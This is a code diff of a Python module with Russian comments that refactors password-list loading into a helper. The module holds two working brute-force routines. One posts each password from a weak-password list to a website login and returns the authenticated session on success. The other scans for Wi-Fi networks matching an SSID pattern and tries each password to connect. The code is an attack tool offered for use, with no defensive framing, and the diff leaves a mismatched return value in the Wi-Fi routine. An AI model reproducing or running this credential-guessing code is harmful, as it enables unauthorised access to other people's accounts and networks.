@@ -1,14 +1,21 @@
 import requests
 from wifi_connect import connect_network_windows, profile_exists, run, get_default_gateway, scan_networks_windows
 
-def brute_force_pass_site(api_url: str, default_sitelogin: str, path_weak_pass: str) -> tuple[requests.Session|None, str|None]:
+# Открыть файл с паролями
+def open_passfile(path_to_file: str):
     try:
-        with open(path_weak_pass, 'r', encoding='utf-8') as file:
-            weak_passwords = file.read().splitlines()
+        with open(path_to_file, 'r', encoding='utf-8') as file:
+            return file.read().splitlines()
     except FileNotFoundError:
-        raise FileNotFoundError(f"File {path_weak_pass} not found.")
+        raise FileNotFoundError(f"File {path_to_file} not found.")
     except UnicodeDecodeError:
-        ValueError(f"Could not decode file {path_weak_pass}")
+        ValueError(f"Could not decode file {path_to_file}")
+
+# Возвращает сессию и пароль
+def brute_force_pass_site(api_url: str, default_sitelogin: str, path_weak_pass: str) -> tuple[requests.Session|None, str|None]:
+    
+    # Открываем файл с паролями
+    weak_passwords = open_passfile(path_weak_pass)
 
     for password in weak_passwords:
         session = requests.Session()
@@ -19,21 +26,17 @@ def brute_force_pass_site(api_url: str, default_sitelogin: str, path_weak_pass: 
         response = session.post(api_url, data=data)
         if response.status_code == 200:
             print(f"[+] Found valid password: {password}")
-            # csrf_token = get_csrf_token(response)
             return session, password
         else:
             print(f"[-] Invalid password: {password}")
 
     return None, None
 
+# Возвращает SSID
 def brute_force_pass_wifi(patern_ssid: str, path_weak_pass: str) -> tuple[str|None, str|None]:
-    try:
-        with open(path_weak_pass, 'r', encoding='utf-8') as file:
-            weak_passwords = file.read().splitlines()
-    except FileNotFoundError:
-        raise FileNotFoundError(f"File {path_weak_pass} not found.")
-    except UnicodeDecodeError:
-        ValueError(f"Could not decode file {path_weak_pass}")
+    
+    # Открываем файл с паролями
+    weak_passwords = open_passfile(path_weak_pass)
 
     results = scan_networks_windows(patern_ssid)
     if not results:
@@ -61,7 +64,7 @@ def brute_force_pass_wifi(patern_ssid: str, path_weak_pass: str) -> tuple[str|No
             except Exception as e:
                 print(f"[-] Error connecting with password {password}: {e}")
 
-    return None, None
+    return None
 
 
 
